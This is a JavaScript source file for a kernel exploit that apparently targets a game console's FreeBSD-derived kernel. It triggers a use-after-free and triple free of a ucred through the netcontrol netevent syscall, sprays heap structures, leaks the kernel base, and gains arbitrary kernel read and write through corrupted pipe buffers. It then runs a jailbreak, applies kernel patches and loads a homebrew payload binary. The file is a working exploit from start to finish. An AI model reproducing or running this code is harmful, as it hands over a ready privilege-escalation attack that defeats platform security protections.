"use strict";

include("userland.js");
include("threading.js");
include("worker.js");
include("loader.js");
include("kernel.js");

//#region Variables
var ATTEMPT_NUM = 8;
var IOV_THREAD_NUM = 3;
var UIO_THREAD_NUM = 3;
var IPV6_SOCK_NUM = 0x20;
var FIND_TWINS_NUM = 0x20;
var FIND_TRIPLET_NUM = 0x20;
var SPRAY_IOV_NUM = 0x200;
var SPRAY_UIO_NUM = 0x200;
var LEAK_KQUEUE_NUM = 0x400;
//#endregion
//#region Contants
var NETCONTROL_NETEVENT_SET_QUEUE = 0x20000003;
var NETCONTROL_NETEVENT_CLEAR_QUEUE = 0x20000007;

var UIO_READ = 0;
var UIO_WRITE = 1;
var UIO_SYSSPACE = 1;

var UIO_IOV_NUM = 0x14;
var MSG_IOV_NUM = 0x17;

var COMMAND_IOV_RECVMSG = 0;
var COMMAND_UIO_READ = 0;
var COMMAND_UIO_WRITE = 1;

var iov_ss = new Array(2);
var uio_ss = new Array(2);
var twins = new Array(2);
var triplets = new Array(3);
var ipv6_socks = new Array(IPV6_SOCK_NUM);
var iov_threads = new Array(IOV_THREAD_NUM);
var uio_threads = new Array(UIO_THREAD_NUM);

var msg = undefined;
var msg_iov = undefined;
var msg_uio = undefined;
var uio_iov_read = undefined;
var uio_iov_write = undefined;

var iov_worker = undefined;
var uio_worker = undefined;

var uaf_sock = undefined;

var kl_lock = undefined;
var kq_fdp = undefined;

var tmp = undefined;

var sendmsg = new NativeFunction(0x1C, "bigint");
var dup = new NativeFunction(0x29, "bigint");
var netcontrol = new NativeFunction(0x63, "bigint");
var socketpair = new NativeFunction(0x87, "bigint");
var sched_yield = new NativeFunction(0x14B, "bigint");
var kqueue = new NativeFunction(0x16A, "bigint");
//#endregion
//#region Functions
function netcontrol_netevent(sock, event) {
    var sz = 8;
    var addr = alloc(sz);
    view(addr).setInt32(0, sock, true);

    if (netcontrol.invoke(-1, event, addr, sz).eq(-1)) {
        throw new SyscallError(`Unable to queue ${sock} in netevent !!`);
    }
}

function spawn_iov_threads() {
    debug("Spawn iov threads..");

    var userland = read_file_str("/download0/userland.js");
    var worker = read_file_str("/download0/worker.js");

    // Prepare workers
    iov_worker = new Worker(alloc(worker_ctx.sizeof), iov_threads.length);

    debug(`iov_worker_ctx_addr: ${iov_worker.ctx.addr}`);

    var iov_start = userland + worker + `
        try {
            var COMMAND_IOV_RECVMSG = 0;

            var recvmsg = new NativeFunction(0x1B, "bigint");

            var iov_worker_ctx_addr = new BigInt("${iov_worker.ctx.addr}");
            var iov_worker = new Worker(iov_worker_ctx_addr);

            var msg_addr = new BigInt("${msg.addr}");
            var iov_ss = [${iov_ss[0]}, ${iov_ss[1]}];

            while (true) {
                var cmd = iov_worker.wait_for_work();
                if (cmd === COMMAND_STOP) break;

                if (cmd === COMMAND_IOV_RECVMSG) {
                    recvmsg.invoke(iov_ss[0], msg_addr, 0);
                }

                iov_worker.signal_finished();
            }
        } catch(e) {
            notify(\`\${thrd_name} Error: \${e.message}\`); 
        }
    `;

    // Create iov threads
    for (var i = 0; i < iov_threads.length; i++) {
        var name = `iov_thread_${i}`;
        var script = `var thrd_name = "${name}";` + iov_start;

        iov_threads[i] = new JSThread(name, script);
        iov_threads[i].execute();
    }

    debug("iov threads spawned !!");
}

function spawn_uio_threads() {
    debug("Spawn uio threads..");

    var userland = read_file_str("/download0/userland.js");
    var worker = read_file_str("/download0/worker.js");

    // Prepare workers
    uio_worker = new Worker(alloc(worker_ctx.sizeof), uio_threads.length);

    debug(`iov_worker_ctx_addr: ${uio_worker.ctx.addr}`);

    var uio_start = userland + worker + `
        try {
            var UIO_IOV_NUM = 0x14;
            var COMMAND_UIO_READ = 0;
            var COMMAND_UIO_WRITE = 1;

            var readv = new NativeFunction(0x78, "bigint");
            var writev = new NativeFunction(0x79, "bigint");

            var uio_worker_ctx_addr = new BigInt("${uio_worker.ctx.addr}");
            var uio_worker = new Worker(uio_worker_ctx_addr);

            var uio_iov_read_addr = new BigInt("${uio_iov_read.addr}");
            var uio_iov_write_addr = new BigInt("${uio_iov_write.addr}");
            var uio_ss = [${uio_ss[0]}, ${uio_ss[1]}];

            while (true) {
                var cmd = uio_worker.wait_for_work();
                if (cmd === COMMAND_STOP) break;

                switch(cmd) {
                    case COMMAND_UIO_READ:
                        if (writev.invoke(uio_ss[1], uio_iov_read_addr, UIO_IOV_NUM).eq(-1)) {
                            throw new SyscallError(\`Unable to write vector of size \${UIO_IOV_NUM} to fd \${uio_ss[1]} !!\`);
                        }
                        break;
                    case COMMAND_UIO_WRITE:
                        if (readv.invoke(uio_ss[0], uio_iov_write_addr, UIO_IOV_NUM).eq(-1)) {
                            throw new SyscallError(\`Unable to read vector of size \${UIO_IOV_NUM} to fd \${uio_ss[0]} !!\`);
                        }
                        break;
                }

                uio_worker.signal_finished();
            }
        } catch(e) {
            notify(\`\${thrd_name} Error: \${e.message}\`); 
        }
    `;

    // Create uio threads
    for (var i = 0; i < uio_threads.length; i++) {
        var name = `uio_thread_${i}`;
        var script = `var thrd_name = "${name}";` + uio_start;

        uio_threads[i] = new JSThread(name, script);
        uio_threads[i].execute();
    }

    debug("uio threads spawned !!");
}

function stop_iov_threads() {
    if (iov_threads.some(x => typeof x !== "undefined")) {
        debug("Signaling stop to iov threads...");

        iov_worker.signal_stop();

        for (var i = 0; i < iov_threads.length; i++) {
            iov_threads[i].join();
        }

        debug("iov threads stopped !!");

        iov_worker.free();
    }
}

function stop_uio_threads() {
    if (uio_threads.some(x => typeof x !== "undefined")) {
        debug("Signaling stop to uio threads...");

        uio_worker.signal_stop();

        for (var i = 0; i < uio_threads.length; i++) {
            uio_threads[i].join();
        }

        debug("uio threads stopped !!");

        uio_worker.free();
    }
}

function find_twins() {
    log("Looking for twins...");

    for (var i = 0; i < FIND_TWINS_NUM; i++) {
        for (var j = 0; j < ipv6_socks.length; j++) {
            view(spray_rthdr0_addr).setUint32(4, (j << 0x10) | 0x1337, true); // ip6_rthdr0.ip6r0_reserved

            set_rthdr(ipv6_socks[j]);
        }

        for (var j = 0; j < ipv6_socks.length; j++) {
            get_rthdr(ipv6_socks[j], ip6_rthdr0.sizeof);

            var marker = view(leak_rthdr0_addr).getUint32(4, true); // ip6_rthdr0.ip6r0_reserved
            var tag = marker & 0xFFFF;
            var idx = marker >>> 0x10;
            if (tag === 0x1337 && idx !== j) {
                debug(`Found twins after ${i} iterations !!`);

                twins[0] = ipv6_socks[j];
                twins[1] = ipv6_socks[idx];
                
                log(`Found twins: ${twins} !!`);

                return;
            }
        }
    }

    throw new Error("Unable to find twins !!");
}

function find_triplet(master, slave) {
    for (var i = 0; i < FIND_TRIPLET_NUM; i++) {
        for (var j = 0; j < ipv6_socks.length; j++) {
            if (ipv6_socks[j].eq(master) || ipv6_socks[j].eq(slave)) {
                continue;
            }

            view(spray_rthdr0_addr).setUint32(4, (j << 0x10) | 0x1337, true); // ip6_rthdr0.ip6r0_reserved

            set_rthdr(ipv6_socks[j]);
        }

        get_rthdr(master, ip6_rthdr0.sizeof);

        var marker = view(leak_rthdr0_addr).getUint32(4, true); // ip6_rthdr0.ip6r0_reserved
        var tag = marker & 0xFFFF;
        var idx = marker >>> 0x10;
        if (tag === 0x1337 && ipv6_socks[idx].neq(master) && ipv6_socks[idx].neq(slave)) {
            debug(`Found triplet after ${i} iterations !!`);
            return ipv6_socks[idx];
        }
    }

    throw new Error("Unable to find triplet !!");
}

function init() {
    log("Environment init started...");

    // Prepare spray/leak rthdr0
    spray_rthdr0_addr = alloc(UCRED_SIZE);
    spray_rthdr0_len = build_rthdr(spray_rthdr0_addr, UCRED_SIZE);

    leak_rthdr0_addr = alloc(UCRED_SIZE);

    // Prepare msg iov
    var msg_iov_addr = alloc(iovec.sizeof * MSG_IOV_NUM);
    msg_iov = iovec.from(msg_iov_addr);
    msg_uio = uio.from(msg_iov_addr);

    msg = msghdr.from(alloc(msghdr.sizeof));

    msg.msg_iov = msg_iov.addr;
    msg.msg_iovlen = MSG_IOV_NUM;

    uio_iov_read = iovec.from(alloc(iovec.sizeof * UIO_IOV_NUM));
    uio_iov_write = iovec.from( alloc(iovec.sizeof * UIO_IOV_NUM));

    var dummy_sz = 0x1000;
    var dummy_addr = alloc(dummy_sz);

    bset(dummy_addr, dummy_sz, 0x41);

    uio_iov_read.iov_base = dummy_addr;
    uio_iov_write.iov_base = dummy_addr;

    // Prepare temp buffer
    tmp = alloc(PAGE_SIZE);

    log("Environment init completed !!");
};

function setup() {
    log("Environment setup started...");

    make_karw_pipe();

    var pair_addr = alloc(8);

    // Create socket pair for iov spraying
    if (socketpair.invoke(AF_UNIX, SOCK_STREAM, 0, pair_addr).eq(-1)) {
        throw new SyscallError("Unable to create socket pair !!");
    }

    iov_ss[0] = view(pair_addr).getInt32(0, true);
    iov_ss[1] = view(pair_addr).getInt32(4, true);

    // Create socket pair for uio spraying
    if (socketpair.invoke(AF_UNIX, SOCK_STREAM, 0, pair_addr).eq(-1)) {
        throw new SyscallError("Unable to create socket pair !!");
    }

    uio_ss[0] = view(pair_addr).getInt32(0, true);
    uio_ss[1] = view(pair_addr).getInt32(4, true);

    debug(`iov_ss: ${iov_ss.map(v => v.hex())}`);
    debug(`uio_ss: ${uio_ss.map(v => v.hex())}`);

    dispose(pair_addr);

    // Set up sockets for spraying and initialize pktopts
    for (var i = 0; i < ipv6_socks.length; i++) {
        ipv6_socks[i] = make_socket(AF_INET6, SOCK_STREAM);
    }

    spawn_iov_threads();
    spawn_uio_threads();

    log("Environment setup completed !!");
};

function cleanup() {
    log("Environment cleanup started...");

    if (uaf_sock !== 0) {
        if (close.invoke(uaf_sock).eq(-1)) {
            throw new SyscallError(`Unable to close fd ${uaf_sock} !!`);
        }

        uaf_sock = 0;
    }

    for (var i = 0; i < iov_ss.length; i++) {
        if (iov_ss[i] === 0) {
            continue;
        }

        if (close.invoke(iov_ss[i]).eq(-1)) {
            throw new SyscallError(`Unable to close fd ${iov_ss[i]} !!`);
        }
    }

    for (var i = 0; i < uio_ss.length; i++) {
        if (uio_ss[i] === 0) {
            continue;
        }

        if (close.invoke(uio_ss[i]).eq(-1)) {
            throw new SyscallError(`Unable to close fd ${uio_ss[i]} !!`);
        }
    }

    for (var i = 0; i < ipv6_socks.length; i++) {
        if (ipv6_socks[i] === 0) {
            continue;
        }

        if (close.invoke(ipv6_socks[i]).eq(-1)) {
            throw new SyscallError(`Unable to close fd ${ipv6_socks[i]} !!`);
        }
    }

    free_karw_pipe();
    
    stop_iov_threads();
    stop_uio_threads();

    log("Environment cleanup completed !!");
};

function ucred_triple_free() {
    log("Ucred double free started...");

    // Prepare msg iov spray. Set 1 as iov_base as it will be interpreted as cr_refcnt
    msg_iov.iov_base = 1;
    msg_iov.iov_len = 1;

    for (var i = 0; i < ATTEMPT_NUM; i++) {
        try {
            // Create dummy socket to be registered and then closed
            var dummy_sock = make_socket(AF_UNIX, SOCK_STREAM);
            if (dummy_sock.eq(-1)) {
                throw new SyscallError("Unable to create socket !!");
            }
        
            debug(`dummy_sock: ${dummy_sock}`);
        
            // Register dummy socket
            netcontrol_netevent(dummy_sock, NETCONTROL_NETEVENT_SET_QUEUE);
        
            // Close the dummy socket
            if (close.invoke(dummy_sock).eq(-1)) {
                throw new SyscallError(`Unable to close fd ${dummy_sock} !!`);
            }
        
            // Allocate a new ucred
            if (setuid.invoke(1).eq(-1)) {
                throw new SyscallError("Unable to set uid to 1 !!");
            }
        
            // Reclaim dummy_sock fd
            uaf_sock = make_socket(AF_UNIX, SOCK_STREAM);
            if (uaf_sock.eq(-1)) {
                throw new SyscallError("Unable to create socket !!");
            }
        
            debug(`uaf_sock: ${uaf_sock}`);
        
            if (uaf_sock.neq(dummy_sock)) {
                throw new Error(`Unable to reclaim fd ${dummy_sock} !!`);
            }
        
            // Free the previous ucred. Now uaf_sock's cr_refcnt of f_cred is 1
            if (setuid.invoke(1).eq(-1)) {
                throw new SyscallError("Unable to set uid to 1 !!");
            }
        
            // Unregister dummy socket and free the file and ucred
            netcontrol_netevent(uaf_sock, NETCONTROL_NETEVENT_CLEAR_QUEUE);
        
            log(`Attempt to set cr_refcnt back to 1 started...`);

            debug("Signaling work to iov threads...");

            // Set cr_refcnt back to 1
            for (var j = 0; j < 0x40; j++) {
                // Reclaim with iov.
                iov_worker.signal_work(COMMAND_IOV_RECVMSG);
                if (sched_yield.invoke().eq(-1)) {
                    throw new SyscallError("Unable to yield scheduler !!");
                }
            
                // Release iov spray
                if (write.invoke(iov_ss[1], tmp, 1).eq(-1)) {
                    throw new SyscallError(`Unable to write to fd ${iov_ss[1]} !!`);
                }

                iov_worker.wait_for_finished();
            
                if (read.invoke(iov_ss[0], tmp, 1).eq(-1)) {
                    throw new SyscallError(`Unable to write to fd ${iov_ss[0]} !!`);
                }
            }

            debug("iov threads work done !!");
        
            // Double free ucred.
            // Note: Only dup works because it does not check fhold
            var uaf_sock_dup = dup.invoke(uaf_sock);
            if (uaf_sock_dup.eq(-1)) {
                throw new SyscallError(`Unable to duplicate fd ${uaf_sock} !!`);
            }
        
            if (close.invoke(uaf_sock_dup).eq(-1)) {
                throw new SyscallError(`Unable to close fd ${uaf_sock_dup} !!`);
            }
        
            // Find twins
            find_twins();

            break;
        } catch(e) {
            if (e.name === "SyscallError") {
                throw e;
            }

            log(`[${i + 1}/${ATTEMPT_NUM}] ${e}`);
            log("Reattempt...");

            if (uaf_sock !== 0) {
                if (close.invoke(uaf_sock).eq(-1)) {
                    throw new SyscallError(`Unable to close fd ${uaf_sock} !!`);
                }
            
                uaf_sock = 0;
            }
        }
    }

    if (i === ATTEMPT_NUM) {
        throw new Error("Unable to ucred double free !!");
    }

    log(`Ucred double free achieved !!`);

    log("Ucred triple free started...");

    log(`Attempt to set cr_refcnt back to 1 started...`);

    free_rthdr(twins[1]);

    debug("Signaling work to iov threads...");

    var reclaimed = false;

    // Set cr_refcnt back to 1
    for (var i = 0; i < SPRAY_IOV_NUM; i++) {
        // Reclaim with iov
        iov_worker.signal_work(COMMAND_IOV_RECVMSG);
        if (sched_yield.invoke().eq(-1)) {
            throw new SyscallError("Unable to yield scheduler !!");
        }

        get_rthdr(twins[0], ip6_rthdr0.sizeof);

        var cr_refcnt = view(leak_rthdr0_addr).getInt32(0, true);
        if (cr_refcnt === 1) {
            debug(`Set cr_refcnt back to 1 after ${i} iterations !!`);
            reclaimed = true;
            break;
        }

        // Release iov spray
        if (write.invoke(iov_ss[1], tmp, 1).eq(-1)) {
            throw new SyscallError(`Unable to write to fd ${iov_ss[1]} !!`);
        }
        
        iov_worker.wait_for_finished();

        if (read.invoke(iov_ss[0], tmp, 1).eq(-1)) {
            throw new SyscallError(`Unable to write to fd ${iov_ss[0]} !!`);
        }
    }

    debug("iov threads work done !!");

    if (!reclaimed) {
        throw new Error("Unable to set cr_refcnt back to 1 !!");
    }

    log(`Set cr_refcnt back to 1 !!`);

    triplets[0] = twins[0];

    // Triple free ucred.
    var uaf_sock_dup = dup.invoke(uaf_sock);
    if (uaf_sock_dup.eq(-1)) {
        throw new SyscallError(`Unable to duplicate fd ${uaf_sock} !!`);
    }

    if (close.invoke(uaf_sock_dup).eq(-1)) {
        throw new SyscallError(`Unable to close fd ${uaf_sock_dup} !!`);
    }

    log("Looking for triplets...");

    triplets[1] = find_triplet(triplets[0], -1);

    if (write.invoke(iov_ss[1], tmp, 1).eq(-1)) {
        throw new SyscallError(`Unable to write to fd ${iov_ss[1]} !!`);
    }

    triplets[2] = find_triplet(triplets[0], triplets[1]);

    iov_worker.wait_for_finished();

    if (read.invoke(iov_ss[0], tmp, 1).eq(-1)) {
        throw new SyscallError(`Unable to write to fd ${iov_ss[0]} !!`);
    }

    log(`Found triplet: ${triplets} !!`);

    log(`Ucred triple free achieved !!`);
}

function leak_kqueue() {
    log("Leak kqueue started...");

    free_rthdr(triplets[2]);

    var leaked = false;
    for (var i = 0; i < LEAK_KQUEUE_NUM; i++) {
        var kq = kqueue.invoke();
        if (kq.eq(-1)) {
            throw new SyscallError("Unable to get kqueue !!");
        }

        get_rthdr(triplets[0], KQUEUE_SIZE);

        var kq_hdr = view(leak_rthdr0_addr).getBigInt(8, true);
        if (kq_hdr.eq(0x1430000)) {
            debug(`Leaked kqueue after ${i} iterations !!`);
            leaked = true;
            break;
        }

        if (close.invoke(kq).eq(-1)) {
            throw new SyscallError(`Unable to close fd ${kq} !!`);
        }
    }

    if (!leaked) {
        throw new Error("Unable to leak kqueue !!");
    }

    log("Leaked kqueue !!");

    kl_lock = view(leak_rthdr0_addr).getBigInt(0x60, true);
    kq_fdp = view(leak_rthdr0_addr).getBigInt(0x98, true);
    kernel_base = kl_lock.sub(KernelMisc.KL_LOCK(version));

    debug(`kq_fdp: ${kq_fdp}`);
    debug(`kl_lock: ${kl_lock}`);

    log(`kernel base: ${kernel_base}`);

    // Close kqueue to free buffer
    if (close.invoke(kq).eq(-1)) {
        throw new SyscallError(`Unable to close fd ${kq} !!`);
    }

    triplets[2] = find_triplet(triplets[0], triplets[1]);

    debug(`Found triplet: ${triplets} !!`);

    log("Leak kqueue completed !!");
}

function kread_slow(addr, sz) {
    // Prepare leak buffers
    var leak_bufs = new Array(uio_threads.length);
    for (var i = 0; i < leak_bufs.length; i++) {
        leak_bufs[i] = alloc(sz);
    }

    // Set send buf size
    var buf_sz_addr = alloc(4);
    view(buf_sz_addr).setInt32(0, sz, true);

    if (setsockopt.invoke(uio_ss[1], SOL_SOCKET, SO_SNDBUF, buf_sz_addr, 4).eq(-1)) {
        throw new SyscallError(`Unable to set socket option for fd ${uio_ss[1]} !!`);
    }

    // Fill queue
    if (write.invoke(uio_ss[1], tmp, sz).eq(-1)) {
        throw new SyscallError(`Unable to write to fd ${uio_ss[1]} !!`);
    }

    // Set iov length
    uio_iov_read.iov_len = sz;

    // Free one
    free_rthdr(triplets[2]);

    debug("Signaling work to uio threads...");

    var reclaimed = false;

    // Reclaim with uio
    for (var i = 0; i < SPRAY_UIO_NUM; i++) {
        uio_worker.signal_work(COMMAND_UIO_READ);
        if (sched_yield.invoke().eq(-1)) {
            throw new SyscallError("Unable to yield scheduler !!");
        }

        // Leak with other rthdr
        get_rthdr(triplets[0], iovec.sizeof);

        var iov_len = view(leak_rthdr0_addr).getInt32(8, true);
        if (iov_len === UIO_IOV_NUM) {
            debug(`Reclaim with uio after ${i} iterations !!`);
            reclaimed = true;
            break;
        }

        // Wake up all threads
        if (read.invoke(uio_ss[0], tmp, sz).eq(-1)) {
            throw new SyscallError(`Unable to read from fd ${uio_ss[0]} !!`);
        }

        for (var j = 0; j < leak_bufs.length; j++) {
            if (read.invoke(uio_ss[0], leak_bufs[j], sz).eq(-1)) {
                throw new SyscallError(`Unable to read from fd ${uio_ss[0]} !!`);
            }
        }

        uio_worker.wait_for_finished();

        // Fill queue
        if (write.invoke(uio_ss[1], tmp, sz).eq(-1)) {
            throw new SyscallError(`Unable to write to fd ${uio_ss[1]} !!`);
        }
    }

    debug("uio threads work done !!");

    if (!reclaimed) {
        throw new Error("Unable to reclaim with uio !!");
    }

    var uio_iov = view(leak_rthdr0_addr).getBigInt(0, true);

    // Prepare uio reclaim buffer
    msg_uio.uio_iov = uio_iov;
    msg_uio.uio_iovcnt = UIO_IOV_NUM;
    msg_uio.uio_offset = -1;
    msg_uio.uio_resid = sz;
    msg_uio.uio_segflg = UIO_SYSSPACE;
    msg_uio.uio_rw = UIO_WRITE;
    msg_uio.uio_td = 0;

    msg_iov.from_at(3).iov_base = addr;
    msg_iov.from_at(3).iov_len = sz;

    // Free second one
    free_rthdr(triplets[1]);

    debug("Signaling work to iov threads...");

    reclaimed = false;

    // Reclaim uio with iov
    for (var i = 0; i < SPRAY_IOV_NUM; i++) {
        // Reclaim with iov
        iov_worker.signal_work(COMMAND_IOV_RECVMSG);
        if (sched_yield.invoke().eq(-1)) {
            throw new SyscallError("Unable to yield scheduler !!");
        }

        // Leak with other rthdr
        get_rthdr(triplets[0], uio.sizeof + iovec.sizeof);

        var uio_segflg = view(leak_rthdr0_addr).getInt32(0x20, true);
        if (uio_segflg === UIO_SYSSPACE) {
            debug(`Reclaim uio with iov after ${i} iterations !!`);
            reclaimed = true;
            break;
        }

        // Release iov spray
        if (write.invoke(iov_ss[1], tmp, 1).eq(-1)) {
            throw new SyscallError(`Unable to write to fd ${iov_ss[1]} !!`);
        }
        
        iov_worker.wait_for_finished();

        if (read.invoke(iov_ss[0], tmp, 1).eq(-1)) {
            throw new SyscallError(`Unable to write to fd ${iov_ss[0]} !!`);
        }
    }

    debug("iov threads work done !!");

    if (!reclaimed) {
        throw new Error("Unable to reclaim uio with iov !!");
    }

    // Wake up all threads
    if (read.invoke(uio_ss[0], tmp, sz).eq(-1)) {
        throw new SyscallError(`Unable to read from fd ${uio_ss[0]} !!`);
    }
    
    // Read the results now
    var leak_buf;

    // Get leak
    var spray_val = new BigInt("0x4141414141414141");
    for (var i = 0; i < leak_bufs.length; i++) {
        if (read.invoke(uio_ss[0], leak_bufs[i], sz).eq(-1)) {
            throw new SyscallError(`Unable to read from fd ${uio_ss[0]} !!`);
        }

        var val = view(leak_bufs[i]).getBigInt(0, true);
        debug(`leak_bufs[${i}]: ${val}`);
        if (val.neq(spray_val)) {
            triplets[1] = find_triplet(triplets[0], -1);

            leak_buf = leak_bufs[i];
            continue;
        }

        dispose(leak_bufs[i]);
    }

    uio_worker.wait_for_finished();

    // Release iov spray
    if (write.invoke(iov_ss[1], tmp, 1).eq(-1)) {
        throw new SyscallError(`Unable to write to fd ${iov_ss[1]} !!`);
    }

    triplets[2] = find_triplet(triplets[0], triplets[1]);

    iov_worker.wait_for_finished();

    if (read.invoke(iov_ss[0], tmp, 1).eq(-1)) {
        throw new SyscallError(`Unable to write to fd ${iov_ss[0]} !!`);
    }

    debug(`Found triplet: ${triplets} !!`);

    if (typeof leak_buf === "undefined") {
        throw new Error(`Unable to kread ${addr} !!`);
    }

    return leak_buf;
}

function kwrite_slow(dst, src, sz) {
    // Set send buf size
    var buf_sz_addr = alloc(4);
    view(buf_sz_addr).setInt32(0, sz, true);

    if (setsockopt.invoke(uio_ss[1], SOL_SOCKET, SO_SNDBUF, buf_sz_addr, 4).eq(-1)) {
        throw new SyscallError(`Unable to set socket option for fd ${uio_ss[1]} !!`);
    }
    
    // Set iov length
    uio_iov_write.iov_len = sz;

    // Free one
    free_rthdr(triplets[2]);

    debug("Signaling work to uio threads...");

    var reclaimed = false;

    // Reclaim with uio
    for (var i = 0; i < SPRAY_UIO_NUM; i++) {
        uio_worker.signal_work(COMMAND_UIO_WRITE);
        if (sched_yield.invoke().eq(-1)) {
            throw new SyscallError("Unable to yield scheduler !!");
        }

        // Leak with other rthdr
        get_rthdr(triplets[0], iovec.sizeof);

        var iov_len = view(leak_rthdr0_addr).getInt32(8, true);
        if (iov_len === UIO_IOV_NUM) {
            debug(`Reclaim with uio after ${i} iterations !!`);
            reclaimed = true;
            break;
        }

        // Wake up all threads
        for (var j = 0; j < uio_threads.length; j++) {
            if (write.invoke(uio_ss[1], src, sz).eq(-1)) {
                throw new SyscallError(`Unable to read from fd ${uio_ss[1]} !!`);
            }
        }

        uio_worker.wait_for_finished();
    }

    debug("uio threads work done !!");

    if (!reclaimed) {
        throw new Error("Unable to reclaim with uio !!");
    }

    var uio_iov = view(leak_rthdr0_addr).getBigInt(0, true);

    // Prepare uio reclaim buffer
    msg_uio.uio_iov = uio_iov;
    msg_uio.uio_iovcnt = UIO_IOV_NUM;
    msg_uio.uio_offset = -1;
    msg_uio.uio_resid = sz;
    msg_uio.uio_segflg = UIO_SYSSPACE;
    msg_uio.uio_rw = UIO_READ;
    msg_uio.uio_td = 0;

    msg_iov.from_at(3).iov_base = dst;
    msg_iov.from_at(3).iov_len = sz;

    // Free second one
    free_rthdr(triplets[1]);

    debug("Signaling work to iov threads...");

    reclaimed = false;

    // Reclaim uio with iov
    for (var i = 0; i < SPRAY_IOV_NUM; i++) {
        // Reclaim with iov
        iov_worker.signal_work(COMMAND_IOV_RECVMSG);
        if (sched_yield.invoke().eq(-1)) {
            throw new SyscallError("Unable to yield scheduler !!");
        }

        // Leak with other rthdr
        get_rthdr(triplets[0], uio.sizeof + iovec.sizeof);

        var uio_segflg = view(leak_rthdr0_addr).getInt32(0x20, true);
        if (uio_segflg === UIO_SYSSPACE) {
            debug(`Reclaim uio with iov after ${i} iterations !!`);
            reclaimed = true;
            break;
        }

        // Release iov spray
        if (write.invoke(iov_ss[1], tmp, 1).eq(-1)) {
            throw new SyscallError(`Unable to write to fd ${iov_ss[1]} !!`);
        }
        
        iov_worker.wait_for_finished();

        if (read.invoke(iov_ss[0], tmp, 1).eq(-1)) {
            throw new SyscallError(`Unable to write to fd ${iov_ss[0]} !!`);
        }
    }

    debug("iov threads work done !!");

    if (!reclaimed) {
        throw new Error("Unable to reclaim uio with iov !!");
    }

    // Corrupt data
    for (var i = 0; i < uio_threads.length; i++) {
        if (write.invoke(uio_ss[1], src, sz).eq(-1)) {
            throw new SyscallError(`Unable to read from fd ${uio_ss[1]} !!`);
        }
    }

    triplets[1] = find_triplet(triplets[0], -1);

    uio_worker.wait_for_finished();

    // Release iov spray
    if (write.invoke(iov_ss[1], tmp, 1).eq(-1)) {
        throw new SyscallError(`Unable to write to fd ${iov_ss[1]} !!`);
    }

    triplets[2] = find_triplet(triplets[0], triplets[1]);

    iov_worker.wait_for_finished();

    if (read.invoke(iov_ss[0], tmp, 1).eq(-1)) {
        throw new SyscallError(`Unable to write to fd ${iov_ss[0]} !!`);
    }

    debug(`Found triplet: ${triplets} !!`);
}

function kread8_slow(addr) {
    return view(kread_slow(addr, 8)).getBigInt(0, true);
}

function remove_uaf_file() {
    var uaf_fp = fget(uaf_sock);
    debug(`uaf_fp: ${uaf_fp}`);

    // Remove uaf sock
    fput(uaf_sock, 0);
    uaf_sock = 0;

    var removed = 0;
    // Remove triple freed file from uaf sock
    for (var i = 0; i < 0x100; i++) {
        var sock = make_socket(AF_UNIX, SOCK_STREAM);
        if (sock.eq(-1)) {
            throw new SyscallError("Unable to create socket !!");
        }

        if (fget(sock).eq(uaf_fp)) {
            debug(`Socket ${sock} uses uaf fp, removing...`);
            fput(sock, 0);
            removed++;
        }

        close.invoke(sock);

        if (removed === 3) {
            log(`Cleanup uaf fp after ${i} iterations !!`);
            break;
        }
    }
};

function make_karw() {
    log("Initiate kernel ARW...");

    fdt_ofiles = kread8_slow(kq_fdp);
    debug(`fdt_ofiles: ${fdt_ofiles}`);

    var master_pipe_fp = kread8_slow(fdt_ofiles.add(master_pipe[0] * FILEDESCENT_SIZE));
    debug(`master_pipe_fp: ${master_pipe_fp}`);

    var slave_pipe_fp = kread8_slow(fdt_ofiles.add(slave_pipe[0] * FILEDESCENT_SIZE));
    debug(`slave_pipe_fp: ${slave_pipe_fp}`);
    
    var master_pipe_f_data = kread8_slow(master_pipe_fp);
    debug(`master_pipe_f_data: ${master_pipe_f_data}`);
    
    var slave_pipe_f_data = kread8_slow(slave_pipe_fp);
    debug(`slave_pipe_f_data: ${slave_pipe_f_data}`);
    
    var pipe_buf_addr = alloc(pipebuf.sizeof);
    var pipe_buf = pipebuf.from(pipe_buf_addr);

    pipe_buf.cnt = 0;
    pipe_buf.in = 0;
    pipe_buf.out = 0;
    pipe_buf.size = PAGE_SIZE;
    pipe_buf.buffer = slave_pipe_f_data;

    kwrite_slow(master_pipe_f_data, pipe_buf.addr, pipebuf.sizeof);

    dispose(pipe_buf_addr);

    kv = new KernelView(master_pipe, slave_pipe);

    log("Achieved kernel ARW !!");
};
//#endregion
//#region Structs
var iovec = new Struct("iovec", [
    { type: "Uint64", name: "iov_base" },
    { type: "Uint64", name: "iov_len" }
]);

var msghdr = new Struct("msghdr", [
    { type: "Uint64", name: "msg_name" },
    { type: "Uint32", name: "msg_namelen" },
    { type: "iovec*", name: "msg_iov" },
    { type: "Int32", name: "msg_iovlen" },
    { type: "Uint64", name: "msg_control" },
    { type: "Uint32", name: "msg_controllen" },
    { type: "Int32", name: "msg_flags" }
]);

var uio = new Struct("uio", [
    { type: "Uint64", name: "uio_iov" },
    { type: "Uint32", name: "uio_iovcnt" },
    { type: "Uint64", name: "uio_offset" },
    { type: "Uint64", name: "uio_resid" },
    { type: "Uint32", name: "uio_segflg" },
    { type: "Uint32", name: "uio_rw" },
    { type: "Uint64", name: "uio_td" },
]);
//#endregion

log("===NETCTRL===");

init();
setup();

try {
    ucred_triple_free();
    leak_kqueue();
    make_karw();

    // Increase reference counts for the pipes
    inc_karw_pipe_refcnt();

    log("Corrupted context cleanup started...");

    // Remove rthdr pointers from triplets
    for (var i = 0; i < triplets.length; i++) {
        remove_rthdr_from_so(triplets[i]);
    }

    // Remove triple freed file from free list
    remove_uaf_file();

    log("Corrupted context cleanup complated !!");
} finally {
    cleanup();
}

// Find allproc
find_all_proc();

// Avoid reapplying if already done 
if (setuid.invoke(0).eq(-1)) {
    // Read bin payload
    //var bin = read_file("/download0/hen.bin");
    var bin = read_file("/download0/goldhen.bin");

    // Jailbreak
    jailbreak();

    // Kernel patches
    kernel_patches();

    notify("Jailbreak successfull !!");

    // Load bin payload
    load_bin(bin);
}

log("===END===");